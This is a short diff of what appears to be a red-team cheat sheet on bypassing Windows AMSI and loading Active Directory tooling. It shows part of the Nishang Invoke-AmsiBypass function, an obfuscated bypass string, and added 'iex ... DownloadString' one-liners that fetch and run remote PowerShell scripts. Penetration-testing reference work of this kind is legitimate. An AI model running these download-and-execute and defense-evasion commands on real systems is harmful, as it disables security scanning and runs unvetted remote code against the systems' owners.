@@ -175,7 +175,7 @@ if ($PSVersionTable.PSVersion.Major -gt 2) {
 ## method 2 :  Nishang all in one
 
 ### TIPS : Nishang only work with reflective powershell (.ps1 file) when use reflective binary (exe file) get error !!
-```
+```powershell
 function Invoke-AmsiBypass
 {
 <#
@@ -568,7 +568,8 @@ Sv  ('R9'+'HYt') ( " ) )93]rahC[]gnirtS[,'UCS'(ecalpeR.)63]rahC[]gnirtS[,'aEm'(e
 
 # 2. load ad-module
 ```
- iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
+iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/kh4sh3i/Amsi-Bypass/refs/heads/main/Import-AD.ps1');Import-AD
+iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
 ```
 
 # 3. Windows Privilege Escalation Awesome Script (.exe)
